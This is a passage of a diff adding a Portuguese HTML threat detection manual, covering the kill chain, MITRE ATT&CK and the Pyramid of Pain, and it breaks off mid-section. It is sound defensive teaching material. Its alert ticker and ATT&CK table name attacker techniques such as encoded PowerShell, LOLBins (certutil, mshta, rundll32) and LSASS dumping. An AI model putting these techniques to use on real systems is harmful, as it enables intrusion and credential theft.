@@ -1,0 +1,1722 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>OPERAÇÃO VIGIA · Manual Definitivo de Threat Detection</title>
+<style>
+:root{
+  --bg:#070B12;
+  --bg2:#0C1320;
+  --panel:#0F1826;
+  --panel2:#131F30;
+  --ink:#E8EEF5;
+  --ink-dim:#8FA3BC;
+  --ink-faint:#5A6E88;
+  --line:#1E2D42;
+  --sig:#3DF5A0;       /* verde sinal — telemetria viva */
+  --sig-dim:#1d7a52;
+  --amber:#FFB23E;     /* âmbar — alerta */
+  --red:#FF5C6C;       /* vermelho — compromisso */
+  --blue:#5BB0FF;      /* azul — informação */
+  --violet:#B98CFF;    /* roxo — OSINT/inovação */
+  --mono:'SFMono-Regular',ui-monospace,'Cascadia Code','JetBrains Mono',Menlo,Consolas,monospace;
+  --sans:'Inter','Segoe UI',system-ui,-apple-system,sans-serif;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{
+  background:var(--bg);
+  color:var(--ink);
+  font-family:var(--sans);
+  line-height:1.6;
+  -webkit-font-smoothing:antialiased;
+  overflow-x:hidden;
+}
+body::before{
+  content:"";position:fixed;inset:0;z-index:0;pointer-events:none;
+  background:
+    radial-gradient(900px 500px at 85% -5%, rgba(61,245,160,.06), transparent 60%),
+    radial-gradient(700px 600px at -10% 100%, rgba(185,140,255,.05), transparent 60%);
+}
+/* scanline atmosphere */
+body::after{
+  content:"";position:fixed;inset:0;z-index:0;pointer-events:none;opacity:.025;
+  background:repeating-linear-gradient(0deg,#fff 0,#fff 1px,transparent 1px,transparent 3px);
+}
+
+/* ---------- LAYOUT ---------- */
+.shell{display:grid;grid-template-columns:280px 1fr;min-height:100vh;position:relative;z-index:1}
+
+/* ---------- SIDEBAR ---------- */
+.sidebar{
+  position:sticky;top:0;height:100vh;overflow-y:auto;
+  background:linear-gradient(180deg,var(--bg2),var(--bg));
+  border-right:1px solid var(--line);
+  padding:22px 16px 60px;
+}
+.brand{display:flex;align-items:center;gap:10px;padding:6px 8px 18px;border-bottom:1px solid var(--line);margin-bottom:16px}
+.brand .dot{width:11px;height:11px;border-radius:50%;background:var(--sig);box-shadow:0 0 12px var(--sig);animation:pulse 2.4s infinite}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.35}}
+.brand b{font-family:var(--mono);font-size:13px;letter-spacing:.14em;color:var(--ink)}
+.brand small{display:block;font-family:var(--mono);font-size:9.5px;letter-spacing:.22em;color:var(--ink-faint);margin-top:2px}
+
+.navsearch{width:100%;background:var(--panel);border:1px solid var(--line);color:var(--ink);
+  font-family:var(--mono);font-size:11.5px;padding:9px 11px;border-radius:7px;margin-bottom:14px;outline:none}
+.navsearch:focus{border-color:var(--sig-dim)}
+.navsearch::placeholder{color:var(--ink-faint)}
+
+.navgroup{margin-bottom:6px}
+.navgroup>span{display:block;font-family:var(--mono);font-size:9.5px;letter-spacing:.18em;
+  color:var(--ink-faint);padding:12px 9px 6px;text-transform:uppercase}
+.sidebar a{
+  display:flex;align-items:center;gap:9px;text-decoration:none;color:var(--ink-dim);
+  font-size:12.5px;padding:7px 10px;border-radius:7px;border:1px solid transparent;transition:.14s;
+}
+.sidebar a .ic{font-family:var(--mono);font-size:11px;width:18px;text-align:center;color:var(--ink-faint)}
+.sidebar a:hover{background:var(--panel);color:var(--ink);border-color:var(--line)}
+.sidebar a.active{background:var(--panel2);color:var(--sig);border-color:var(--sig-dim)}
+.sidebar a.active .ic{color:var(--sig)}
+
+/* ---------- MAIN ---------- */
+.main{padding:0 0 120px;max-width:1080px;width:100%}
+.wrap{padding:0 46px}
+
+/* hero */
+.hero{padding:64px 46px 40px;border-bottom:1px solid var(--line);position:relative;overflow:hidden}
+.hero .kicker{font-family:var(--mono);font-size:11px;letter-spacing:.28em;color:var(--sig);margin-bottom:18px;display:flex;gap:10px;align-items:center}
+.hero .kicker::before{content:"●";font-size:8px;animation:pulse 2s infinite}
+.hero h1{font-size:clamp(34px,5.5vw,62px);line-height:1.02;letter-spacing:-.02em;font-weight:800;margin-bottom:18px}
+.hero h1 .g{background:linear-gradient(120deg,var(--sig),var(--blue) 60%,var(--violet));-webkit-background-clip:text;background-clip:text;color:transparent}
+.hero p.lead{font-size:16.5px;color:var(--ink-dim);max-width:680px;margin-bottom:26px}
+.hero .meta{display:flex;flex-wrap:wrap;gap:8px}
+.tag{font-family:var(--mono);font-size:10.5px;letter-spacing:.08em;padding:5px 11px;border:1px solid var(--line);
+  border-radius:20px;color:var(--ink-dim);background:var(--panel)}
+.tag.s{color:var(--sig);border-color:var(--sig-dim)}
+.tag.v{color:var(--violet);border-color:#4a3a6b}
+.tag.a{color:var(--amber);border-color:#6b5424}
+
+/* live ticker */
+.ticker{margin:0;background:#05080E;border-bottom:1px solid var(--line);overflow:hidden;white-space:nowrap;padding:8px 0}
+.ticker-track{display:inline-block;animation:scroll 38s linear infinite;font-family:var(--mono);font-size:11px;color:var(--ink-faint)}
+.ticker-track span{margin:0 26px}
+.ticker-track b.r{color:var(--red)}.ticker-track b.g{color:var(--sig)}.ticker-track b.a{color:var(--amber)}
+@keyframes scroll{from{transform:translateX(0)}to{transform:translateX(-50%)}}
+
+/* sections */
+section{padding:54px 0 10px;scroll-margin-top:18px}
+.eyebrow{font-family:var(--mono);font-size:11px;letter-spacing:.2em;color:var(--violet);margin-bottom:10px;display:flex;align-items:center;gap:10px}
+.eyebrow .num{color:var(--ink-faint)}
+h2.sec{font-size:clamp(26px,3.6vw,38px);letter-spacing:-.015em;font-weight:800;margin-bottom:8px;line-height:1.08}
+.sec-sub{color:var(--ink-dim);font-size:15px;max-width:720px;margin-bottom:26px}
+
+/* feynman block */
+.feynman{background:linear-gradient(135deg,rgba(91,176,255,.07),rgba(185,140,255,.05));
+  border:1px solid #243a55;border-left:3px solid var(--blue);border-radius:12px;padding:20px 22px;margin:18px 0}
+.feynman .lbl{font-family:var(--mono);font-size:10.5px;letter-spacing:.16em;color:var(--blue);
+  display:flex;align-items:center;gap:8px;margin-bottom:10px}
+.feynman .lbl::before{content:"◓";font-size:13px}
+.feynman p{color:var(--ink);font-size:15px}
+.feynman p+p{margin-top:9px}
+.feynman .em{color:var(--blue);font-weight:600}
+
+/* attack card */
+.card{background:var(--panel);border:1px solid var(--line);border-radius:14px;margin:22px 0;overflow:hidden;transition:.18s}
+.card:hover{border-color:#2a3e5c}
+.card-head{display:flex;align-items:center;justify-content:space-between;gap:14px;
+  padding:16px 20px;background:var(--panel2);border-bottom:1px solid var(--line);cursor:pointer}
+.card-head .t{display:flex;align-items:center;gap:12px}
+.card-head .t .mi{font-family:var(--mono);font-size:10px;color:var(--ink-faint);
+  border:1px solid var(--line);padding:3px 7px;border-radius:5px;white-space:nowrap}
+.card-head h3{font-size:17px;font-weight:700;letter-spacing:-.01em}
+.sev{font-family:var(--mono);font-size:10px;letter-spacing:.1em;padding:4px 10px;border-radius:20px;white-space:nowrap}
+.sev.crit{color:var(--red);background:rgba(255,92,108,.1);border:1px solid #5c2730}
+.sev.high{color:var(--amber);background:rgba(255,178,62,.1);border:1px solid #5c4724}
+.sev.med{color:var(--blue);background:rgba(91,176,255,.1);border:1px solid #25425c}
+.chev{font-family:var(--mono);color:var(--ink-faint);transition:.2s;font-size:13px}
+.card.open .chev{transform:rotate(90deg);color:var(--sig)}
+.card-body{display:none;padding:0}
+.card.open .card-body{display:block;animation:fade .25s}
+@keyframes fade{from{opacity:0;transform:translateY(-6px)}to{opacity:1;transform:none}}
+
+.stage{padding:18px 20px;border-bottom:1px dashed var(--line)}
+.stage:last-child{border-bottom:none}
+.stage .sh{font-family:var(--mono);font-size:10.5px;letter-spacing:.14em;margin-bottom:11px;display:flex;align-items:center;gap:9px}
+.stage.atk .sh{color:var(--red)}.stage.atk .sh::before{content:"⚔";}
+.stage.det .sh{color:var(--sig)}.stage.det .sh::before{content:"◎";}
+.stage.log .sh{color:var(--amber)}.stage.log .sh::before{content:"≣";}
+.stage.read .sh{color:var(--blue)}.stage.read .sh::before{content:"⊙";}
+.stage.rule .sh{color:var(--violet)}.stage.rule .sh::before{content:"⛨";}
+.stage p{font-size:14px;color:var(--ink-dim)}
+.stage p strong{color:var(--ink)}
+
+/* code/log terminal */
+.term{background:#04070C;border:1px solid var(--line);border-radius:9px;margin:10px 0;overflow:hidden;font-family:var(--mono)}
+.term-bar{display:flex;align-items:center;gap:7px;padding:8px 12px;background:#080D15;border-bottom:1px solid var(--line)}
+.term-bar i{width:9px;height:9px;border-radius:50%;display:inline-block}
+.term-bar i:nth-child(1){background:#ff5f57}.term-bar i:nth-child(2){background:#febc2e}.term-bar i:nth-child(3){background:#28c840}
+.term-bar span{margin-left:8px;font-size:10.5px;color:var(--ink-faint);letter-spacing:.05em}
+.term pre{padding:14px 16px;font-size:12.3px;line-height:1.72;overflow-x:auto;color:#c9d6e6;white-space:pre}
+.term pre .c{color:var(--ink-faint)}      /* comment/dim */
+.term pre .k{color:var(--violet)}          /* keyword */
+.term pre .s{color:var(--sig)}             /* string/ok */
+.term pre .r{color:var(--red);font-weight:600} /* danger */
+.term pre .a{color:var(--amber)}           /* warn/highlight */
+.term pre .b{color:var(--blue)}            /* field */
+.term pre .n{color:#e8a0ff}                /* number-ish accent */
+.term pre mark{background:rgba(255,92,108,.18);color:#ffd0d6;padding:1px 3px;border-radius:3px}
+.term pre mark.g{background:rgba(61,245,160,.16);color:#bdfada}
+
+/* mini callouts */
+.note{display:flex;gap:11px;padding:13px 15px;border-radius:9px;margin:12px 0;font-size:13.5px;line-height:1.55}
+.note .ni{font-family:var(--mono);font-size:14px;flex-shrink:0}
+.note.tip{background:rgba(61,245,160,.06);border:1px solid var(--sig-dim);color:var(--ink)}
+.note.tip .ni{color:var(--sig)}
+.note.warn{background:rgba(255,178,62,.06);border:1px solid #5c4724;color:var(--ink)}
+.note.warn .ni{color:var(--amber)}
+.note.osint{background:rgba(185,140,255,.07);border:1px solid #4a3a6b;color:var(--ink)}
+.note.osint .ni{color:var(--violet)}
+.note b{color:var(--ink)}
+
+/* kill chain visual */
+.killchain{display:grid;grid-template-columns:repeat(7,1fr);gap:6px;margin:20px 0}
+@media(max-width:780px){.killchain{grid-template-columns:repeat(2,1fr)}}
+.kc{background:var(--panel);border:1px solid var(--line);border-radius:9px;padding:13px 10px;text-align:center;position:relative;transition:.16s;cursor:default}
+.kc:hover{border-color:var(--sig-dim);transform:translateY(-3px);background:var(--panel2)}
+.kc .n{font-family:var(--mono);font-size:9px;color:var(--ink-faint);letter-spacing:.1em}
+.kc .ic{font-size:20px;margin:7px 0;display:block}
+.kc .t{font-size:11px;font-weight:700;line-height:1.2}
+.kc .d{font-size:9.5px;color:var(--ink-faint);margin-top:4px;font-family:var(--mono)}
+
+/* pyramid of pain */
+.pyramid{margin:20px 0;display:flex;flex-direction:column;align-items:center;gap:5px}
+.pyr{border:1px solid var(--line);border-radius:7px;padding:11px 14px;text-align:center;background:var(--panel);
+  display:flex;align-items:center;justify-content:space-between;gap:14px;transition:.15s;cursor:default}
+.pyr:hover{border-color:#2a3e5c;background:var(--panel2)}
+.pyr .lft{display:flex;align-items:center;gap:11px}
+.pyr .em{font-size:15px}
+.pyr .nm{font-size:13px;font-weight:700}
+.pyr .pain{font-family:var(--mono);font-size:9.5px;letter-spacing:.08em;padding:3px 8px;border-radius:14px}
+.pyr[data-l="1"]{width:55%;border-color:var(--sig-dim)}.pyr[data-l="1"] .pain{color:var(--sig);background:rgba(61,245,160,.1)}
+.pyr[data-l="2"]{width:62%}.pyr[data-l="2"] .pain{color:var(--sig);background:rgba(61,245,160,.08)}
+.pyr[data-l="3"]{width:70%;border-color:#25425c}.pyr[data-l="3"] .pain{color:var(--blue);background:rgba(91,176,255,.08)}
+.pyr[data-l="4"]{width:78%}.pyr[data-l="4"] .pain{color:var(--blue);background:rgba(91,176,255,.08)}
+.pyr[data-l="5"]{width:86%;border-color:#5c4724}.pyr[data-l="5"] .pain{color:var(--amber);background:rgba(255,178,62,.08)}
+.pyr[data-l="6"]{width:93%}.pyr[data-l="6"] .pain{color:var(--amber);background:rgba(255,178,62,.1)}
+.pyr[data-l="7"]{width:100%;border-color:#5c2730}.pyr[data-l="7"] .pain{color:var(--red);background:rgba(255,92,108,.12)}
+
+/* tables */
+.tbl{width:100%;border-collapse:collapse;margin:16px 0;font-size:13px;border:1px solid var(--line);border-radius:10px;overflow:hidden}
+.tbl th{background:var(--panel2);text-align:left;padding:11px 14px;font-family:var(--mono);font-size:10px;
+  letter-spacing:.12em;color:var(--ink-dim);text-transform:uppercase;border-bottom:1px solid var(--line)}
+.tbl td{padding:11px 14px;border-bottom:1px solid var(--line);color:var(--ink-dim);vertical-align:top}
+.tbl tr:last-child td{border-bottom:none}
+.tbl tr:hover td{background:rgba(255,255,255,.015)}
+.tbl td code{font-family:var(--mono);font-size:11.5px;color:var(--sig);background:rgba(61,245,160,.07);padding:1px 6px;border-radius:4px}
+.tbl td.r code{color:var(--red);background:rgba(255,92,108,.07)}
+
+/* progress / completion */
+.toc-prog{position:fixed;top:0;left:0;height:3px;background:linear-gradient(90deg,var(--sig),var(--violet));z-index:99;width:0;transition:width .1s}
+
+/* quiz */
+.quiz{background:linear-gradient(135deg,rgba(185,140,255,.06),rgba(61,245,160,.04));
+  border:1px solid #3a3556;border-radius:12px;padding:20px 22px;margin:20px 0}
+.quiz .q{font-size:15px;font-weight:600;margin-bottom:14px;display:flex;gap:9px}
+.quiz .q .qi{font-family:var(--mono);color:var(--violet);font-size:12px}
+.opt{display:block;width:100%;text-align:left;background:var(--panel);border:1px solid var(--line);
+  color:var(--ink-dim);padding:11px 14px;border-radius:8px;margin-bottom:8px;cursor:pointer;font-size:13.5px;font-family:inherit;transition:.13s}
+.opt:hover{border-color:#2a3e5c;color:var(--ink)}
+.opt.correct{border-color:var(--sig);background:rgba(61,245,160,.1);color:var(--sig)}
+.opt.wrong{border-color:var(--red);background:rgba(255,92,108,.08);color:var(--red)}
+.opt .res{float:right;font-family:var(--mono);font-size:11px;display:none}
+.opt.correct .res,.opt.wrong .res{display:inline}
+.quiz .exp{display:none;margin-top:10px;font-size:13px;color:var(--ink-dim);padding:12px 14px;
+  background:var(--panel);border-radius:8px;border-left:2px solid var(--sig)}
+.quiz.answered .exp{display:block}
+
+/* divider */
+.hr{height:1px;background:var(--line);margin:42px 0;position:relative}
+.hr::after{content:"◆";position:absolute;left:50%;top:-9px;transform:translateX(-50%);
+  background:var(--bg);padding:0 12px;color:var(--ink-faint);font-size:11px}
+
+/* footer */
+.foot{padding:40px 46px;border-top:1px solid var(--line);margin-top:40px;color:var(--ink-faint);font-family:var(--mono);font-size:11px}
+.foot b{color:var(--ink-dim)}
+.foot a{color:var(--sig);text-decoration:none}
+
+/* mobile */
+.menu-btn{display:none}
+@media(max-width:860px){
+  .shell{grid-template-columns:1fr}
+  .sidebar{position:fixed;left:-300px;width:280px;z-index:50;transition:.25s;box-shadow:0 0 40px rgba(0,0,0,.6)}
+  .sidebar.show{left:0}
+  .menu-btn{display:flex;position:fixed;top:14px;right:14px;z-index:60;background:var(--panel2);
+    border:1px solid var(--line);color:var(--sig);width:42px;height:42px;border-radius:10px;
+    align-items:center;justify-content:center;font-family:var(--mono);cursor:pointer;font-size:18px}
+  .wrap,.hero,.foot{padding-left:20px;padding-right:20px}
+}
+
+/* atmospheric heading glow on scroll-in */
+.reveal{opacity:0;transform:translateY(14px);transition:.6s cubic-bezier(.2,.7,.2,1)}
+.reveal.in{opacity:1;transform:none}
+</style>
+</head>
+<body>
+<div class="toc-prog" id="prog"></div>
+<button class="menu-btn" onclick="document.querySelector('.sidebar').classList.toggle('show')">☰</button>
+
+<div class="shell">
+<!-- ===================== SIDEBAR ===================== -->
+<aside class="sidebar">
+  <div class="brand">
+    <span class="dot"></span>
+    <div><b>OPERAÇÃO VIGIA</b><small>THREAT DETECTION FIELD MANUAL</small></div>
+  </div>
+  <input class="navsearch" id="nav-search" placeholder="filtrar seções… (/)" autocomplete="off">
+
+  <nav id="nav">
+  <div class="navgroup"><span>· Fundamentos</span>
+    <a href="#intro"><span class="ic">⌂</span> Como ler este manual</a>
+    <a href="#mindset"><span class="ic">◈</span> A mente do caçador</a>
+    <a href="#killchain"><span class="ic">⛓</span> Kill Chain & ATT&CK</a>
+    <a href="#pyramid"><span class="ic">▲</span> Pirâmide da Dor</a>
+    <a href="#logs101"><span class="ic">≣</span> Anatomia de um log</a>
+  </div>
+  <div class="navgroup"><span>· Catálogo de Ataques</span>
+    <a href="#recon"><span class="ic">⊹</span> Recon & Enumeração</a>
+    <a href="#bruteforce"><span class="ic">⚿</span> Brute Force & Cred.</a>
+    <a href="#phishing"><span class="ic">✉</span> Phishing & Engenharia</a>
+    <a href="#webattacks"><span class="ic">⌖</span> Web: SQLi/XSS/RCE</a>
+    <a href="#execution"><span class="ic">⚡</span> Execução & Payloads</a>
+    <a href="#persistence"><span class="ic">⚓</span> Persistência</a>
+    <a href="#privesc"><span class="ic">▲</span> Escalação de Privilégio</a>
+    <a href="#lateral"><span class="ic">⇄</span> Movimento Lateral</a>
+    <a href="#lotl"><span class="ic">◌</span> LotL & Fileless</a>
+    <a href="#exfil"><span class="ic">⇡</span> Exfiltração & C2</a>
+    <a href="#ransomware"><span class="ic">☣</span> Ransomware</a>
+  </div>
+  <div class="navgroup"><span>· Detecção Aplicada</span>
+    <a href="#absence"><span class="ic">○</span> Detecção pela Ausência</a>
+    <a href="#sigma"><span class="ic">⛨</span> Sigma & Engenharia de Regras</a>
+    <a href="#forensics"><span class="ic">⚲</span> Forense & Timeline</a>
+  </div>
+  <div class="navgroup"><span>· Estratégia</span>
+    <a href="#modeling"><span class="ic">⊞</span> Threat Modeling</a>
+    <a href="#intel"><span class="ic">◉</span> Threat Intelligence</a>
+    <a href="#osint"><span class="ic">✶</span> OSINT: Inovações 2026</a>
+    <a href="#playbook"><span class="ic">▣</span> Playbook do Analista</a>
+    <a href="#final"><span class="ic">★</span> Prova de Fogo</a>
+  </div>
+  </nav>
+</aside>
+
+<!-- ===================== MAIN ===================== -->
+<main class="main">
+<!-- HERO -->
+<div class="hero">
+  <div class="kicker">SISTEMA ARMADO · NÍVEL DEUS · v1.0</div>
+  <h1>O manual de quem<br><span class="g">enxerga no escuro.</span></h1>
+  <p class="lead">Threat Detection, Threat Modeling e Threat Intelligence explicados do zero — como se você tivesse 7 anos e curiosidade infinita — e levados até o nível de quem escreve regra de detecção às 3 da manhã. Cada ataque tem o golpe, o log que ele deixa, e a caça.</p>
+  <div class="meta">
+    <span class="tag s">◎ 30+ técnicas de ataque</span>
+    <span class="tag s">≣ Logs reais comentados</span>
+    <span class="tag v">✶ OSINT inovador</span>
+    <span class="tag a">⛨ Regras Sigma prontas</span>
+    <span class="tag">Técnica de Feynman</span>
+    <span class="tag">MITRE ATT&CK</span>
+  </div>
+</div>
+
+<!-- TICKER -->
+<div class="ticker">
+  <div class="ticker-track">
+    <span><b class="r">ALERTA</b> · 4625 × 142 em 8s — possível password spraying</span>
+    <span><b class="a">WARN</b> · powershell.exe → -enc base64 detectado</span>
+    <span><b class="g">OK</b> · baseline de telemetria estável</span>
+    <span><b class="r">C2</b> · beacon a cada 60s ± jitter para domínio raro</span>
+    <span><b class="a">WARN</b> · ausência de logs do Sysmon no host PREMIUM-17</span>
+    <span><b class="g">HUNT</b> · LOLBins monitorados: certutil, mshta, rundll32</span>
+    <span><b class="r">ALERTA</b> · 4625 × 142 em 8s — possível password spraying</span>
+    <span><b class="a">WARN</b> · powershell.exe → -enc base64 detectado</span>
+    <span><b class="g">OK</b> · baseline de telemetria estável</span>
+    <span><b class="r">C2</b> · beacon a cada 60s ± jitter para domínio raro</span>
+    <span><b class="a">WARN</b> · ausência de logs do Sysmon no host PREMIUM-17</span>
+    <span><b class="g">HUNT</b> · LOLBins monitorados: certutil, mshta, rundll32</span>
+  </div>
+</div>
+
+<div class="wrap">
+<!-- CONTENT INJECTED BELOW -->
+<!-- ============ INTRO ============ -->
+<section id="intro" class="reveal">
+  <div class="eyebrow"><span class="num">00 /</span> COMO LER ESTE MANUAL</div>
+  <h2 class="sec">Três perguntas, sempre as mesmas</h2>
+  <p class="sec-sub">Todo capítulo de ataque responde três coisas, na mesma ordem. Se você decorar esse ritmo, você lê qualquer incidente do mundo.</p>
+
+  <div class="feynman">
+    <div class="lbl">EXPLICANDO PARA UMA CRIANÇA</div>
+    <p>Imagina que sua casa tem uma <span class="em">campainha que grava tudo</span>. Toda vez que alguém encosta na porta, na janela ou no portão, ela escreve num caderninho: <em>"fulano mexeu aqui, nesta hora"</em>. Esse caderninho é o <span class="em">log</span>.</p>
+    <p>O ladrão não quer aparecer no caderninho. Mas é quase impossível mexer em qualquer coisa sem deixar um risquinho. <span class="em">Nosso trabalho é ler o caderninho e descobrir qual risquinho é de gente da casa e qual é de ladrão.</span> Simples assim. Difícil de fazer bem.</p>
+  </div>
+
+  <table class="tbl">
+    <tr><th>Etapa</th><th>Pergunta</th><th>Cor no manual</th></tr>
+    <tr><td><strong style="color:var(--red)">⚔ O ATAQUE</strong></td><td>O que o adversário faz, na mão?</td><td>Vermelho</td></tr>
+    <tr><td><strong style="color:var(--amber)">≣ O LOG</strong></td><td>Que rastro isso deixa, exatamente?</td><td>Âmbar</td></tr>
+    <tr><td><strong style="color:var(--sig)">◎ A CAÇA</strong></td><td>Como eu detecto isso de forma confiável?</td><td>Verde</td></tr>
+    <tr><td><strong style="color:var(--blue)">⊙ A LEITURA</strong></td><td>Como interpreto o log linha por linha?</td><td>Azul</td></tr>
+    <tr><td><strong style="color:var(--violet)">⛨ A REGRA</strong></td><td>Como viro isso em detecção automática (Sigma)?</td><td>Roxo</td></tr>
+  </table>
+
+  <div class="note tip"><span class="ni">▸</span><div><b>Dica de uso:</b> clique no cabeçalho de qualquer card de ataque para abrir/fechar. Use a busca da lateral (atalho <code style="color:var(--sig)">/</code>) para pular direto. Cada seção é independente — leia na ordem que sua curiosidade pedir.</div></div>
+</section>
+
+<div class="hr"></div>
+
+<!-- ============ MINDSET ============ -->
+<section id="mindset" class="reveal">
+  <div class="eyebrow"><span class="num">01 /</span> A MENTE DO CAÇADOR</div>
+  <h2 class="sec">Você procura anomalia, não assinatura</h2>
+  <p class="sec-sub">Antivírus procura "essa coisa exata já é conhecida como ruim". Caçador procura "isso aqui é estranho para este ambiente". A diferença separa quem pega o malware do ano passado de quem pega o atacante de hoje.</p>
+
+  <div class="feynman">
+    <div class="lbl">EXPLICANDO PARA UMA CRIANÇA</div>
+    <p>Pensa numa professora que conhece todos os 30 alunos da sala. Um dia entra uma criança nova que ela nunca viu. A professora <span class="em">não precisa de uma lista de "crianças perigosas"</span> — ela só percebe na hora: <em>"essa eu não conheço, o que ela está fazendo aqui?"</em></p>
+    <p>É isso que um bom caçador faz. Ele conhece tão bem o que é <span class="em">normal</span> no ambiente (o "baseline") que o <span class="em">anormal</span> grita sozinho. Quanto melhor você conhece o normal, mais barulhento o ataque fica.</p>
+  </div>
+
+  <table class="tbl">
+    <tr><th>Mentalidade ingênua</th><th>Mentalidade de caçador</th></tr>
+    <tr><td>"Esse arquivo é um vírus conhecido?"</td><td>"Por que o Word abriu o PowerShell?"</td></tr>
+    <tr><td>"O alerta disparou?"</td><td>"O que <em>deveria</em> ter disparado e ficou em silêncio?"</td></tr>
+    <tr><td>"Bloqueei o IP malicioso."</td><td>"Como ele entrou? O que ele tocou antes de eu ver?"</td></tr>
+    <tr><td>Olha o evento isolado.</td><td>Reconstrói a <em>história</em>: antes, durante, depois.</td></tr>
+    <tr><td>Confia que a ferramenta vê tudo.</td><td>Assume que o atacante tenta <em>cegar</em> a ferramenta.</td></tr>
+  </table>
+
+  <div class="note osint"><span class="ni">✶</span><div><b>Inovação OSINT que muda o jogo:</b> o caçador moderno começa a investigação <em>fora</em> da rede. Antes de o ataque acontecer, dados públicos (vazamentos, certificados TLS recém-emitidos, infraestrutura de C2 sendo montada, menções em fóruns) já contam a história. <b>Detecção que começa em OSINT é detecção que chega antes do alerta.</b> Voltamos nisso fundo na seção de Threat Intelligence.</div></div>
+</section>
+
+<div class="hr"></div>
+
+<!-- ============ KILL CHAIN ============ -->
+<section id="killchain" class="reveal">
+  <div class="eyebrow"><span class="num">02 /</span> O MAPA DO ATAQUE</div>
+  <h2 class="sec">Cyber Kill Chain & MITRE ATT&CK</h2>
+  <p class="sec-sub">Nenhum ataque sério é um único clique. É uma jornada com fases. Se você sabe as fases, sabe onde colocar armadilhas — e sabe em que ponto da invasão o atacante está só de olhar o log.</p>
+
+  <div class="feynman">
+    <div class="lbl">EXPLICANDO PARA UMA CRIANÇA</div>
+    <p>Pra roubar um bolo da cozinha, a criança não teleporta com o bolo. Ela: <span class="em">espia</span> se tem alguém → <span class="em">arruma uma cadeira</span> pra alcançar → <span class="em">sobe</span> → <span class="em">pega</span> o bolo → <span class="em">desce devagar</span> → <span class="em">esconde</span> os rastros (limpa a boca!).</p>
+    <p>Cada uma dessas etapas é uma chance de <span class="em">flagrar</span>. Se a mãe ouve a cadeira arrastando, ela pega a criança <em>antes</em> do bolo sumir. O ataque cibernético é igual: <span class="em">quanto mais cedo na cadeia você detecta, menos dano.</span></p>
+  </div>
+
+  <div class="killchain">
+    <div class="kc"><div class="n">FASE 1</div><span class="ic">🔭</span><div class="t">Recon</div><div class="d">espiar</div></div>
+    <div class="kc"><div class="n">FASE 2</div><span class="ic">🧰</span><div class="t">Weaponize</div><div class="d">preparar arma</div></div>
+    <div class="kc"><div class="n">FASE 3</div><span class="ic">📬</span><div class="t">Delivery</div><div class="d">entregar</div></div>
+    <div class="kc"><div class="n">FASE 4</div><span class="ic">💥</span><div class="t">Exploit</div><div class="d">explorar falha</div></div>
+    <div class="kc"><div class="n">FASE 5</div><span class="ic">⚓</span><div class="t">Install</div><div class="d">fincar pé</div></div>
+    <div class="kc"><div class="n">FASE 6</div><span class="ic">📡</span><div class="t">C2</div><div class="d">controle remoto</div></div>
+    <div class="kc"><div class="n">FASE 7</div><span class="ic">🎯</span><div class="t">Actions</div><div class="d">objetivo final</div></div>
+  </div>
+
+  <p class="sec-sub" style="margin-top:24px"><strong style="color:var(--ink)">MITRE ATT&CK</strong> é a versão "enciclopédia" disso: um catálogo gigante de <em>táticas</em> (o "por quê" — ex.: Persistência) e <em>técnicas</em> (o "como" — ex.: T1547 chaves de Run no registro). Cada técnica tem um código <code style="font-family:var(--mono);color:var(--sig)">Txxxx</code>. Quando você lê um relatório de incidente, ele fala em ATT&CK. Decore o vocabulário, não as 600 técnicas.</p>
+
+  <table class="tbl">
+    <tr><th>Tática (o porquê)</th><th>Exemplo de técnica</th><th>Código</th></tr>
+    <tr><td>Initial Access</td><td>Phishing com anexo</td><td><code>T1566.001</code></td></tr>
+    <tr><td>Execution</td><td>PowerShell</td><td><code>T1059.001</code></td></tr>
+    <tr><td>Persistence</td><td>Registry Run Keys</td><td><code>T1547.001</code></td></tr>
+    <tr><td>Privilege Escalation</td><td>Bypass de UAC</td><td><code>T1548.002</code></td></tr>
+    <tr><td>Defense Evasion</td><td>Limpar logs de evento</td><td><code>T1070.001</code></td></tr>
+    <tr><td>Credential Access</td><td>Dump do LSASS</td><td><code>T1003.001</code></td></tr>
+    <tr><td>Lateral Movement</td><td>Pass-the-Hash / SMB</td><td><code>T1021.002</code></td></tr>
+    <tr><td>Exfiltration</td><td>Exfil por canal C2</td><td><code>T1041</code></td></tr>
+    <tr><td>Impact</td><td>Criptografia (ransomware)</td><td><code>T1486</code></td></tr>
+  </table>
+  <div class="note tip"><span class="ni">▸</span><div>Mapeie <b>cada</b> regra de detecção que você escrever para um código ATT&CK. Isso transforma um monte de alertas soltos num <b>mapa de cobertura</b>: você passa a enxergar exatamente quais táticas você consegue ver e quais são pontos cegos.</div></div>
+</section>
+
+<div class="hr"></div>
+
+<!-- ============ PYRAMID ============ -->
+<section id="pyramid" class="reveal">
+  <div class="eyebrow"><span class="num">03 /</span> ONDE DÓI MAIS NO ATACANTE</div>
+  <h2 class="sec">A Pirâmide da Dor</h2>
+  <p class="sec-sub">Nem toda detecção tem o mesmo valor. Bloquear um hash é fácil pra você e indolor pro atacante (ele troca em 1 segundo). Detectar o <em>comportamento</em> dele dói — porque ele teria que reaprender a trabalhar. Suba a pirâmide.</p>
+
+  <div class="feynman">
+    <div class="lbl">EXPLICANDO PARA UMA CRIANÇA</div>
+    <p>Se você reconhece o ladrão pela <span class="em">camiseta vermelha</span>, ele só troca de camiseta amanhã. Sem esforço. Mas se você reconhece ele pelo <span class="em">jeito de andar</span> — mancando da perna esquerda — aí ele está ferrado. Não dá pra trocar de jeito de andar.</p>
+    <p>Detectar IP e hash = camiseta. Detectar <span class="em">comportamento e técnica</span> = jeito de andar. <b>Mire no jeito de andar.</b></p>
+  </div>
+
+  <div class="pyramid">
+    <div class="pyr" data-l="1"><div class="lft"><span class="em">🔢</span><span class="nm">Hash do arquivo</span></div><span class="pain">TRIVIAL p/ trocar</span></div>
+    <div class="pyr" data-l="2"><div class="lft"><span class="em">🌐</span><span class="nm">Endereço IP</span></div><span class="pain">FÁCIL p/ trocar</span></div>
+    <div class="pyr" data-l="3"><div class="lft"><span class="em">🔗</span><span class="nm">Nome de domínio</span></div><span class="pain">SIMPLES p/ trocar</span></div>
+    <div class="pyr" data-l="4"><div class="lft"><span class="em">🧩</span><span class="nm">Artefatos de rede/host</span></div><span class="pain">CHATO p/ trocar</span></div>
+    <div class="pyr" data-l="5"><div class="lft"><span class="em">🛠</span><span class="nm">Ferramentas</span></div><span class="pain">DIFÍCIL p/ trocar</span></div>
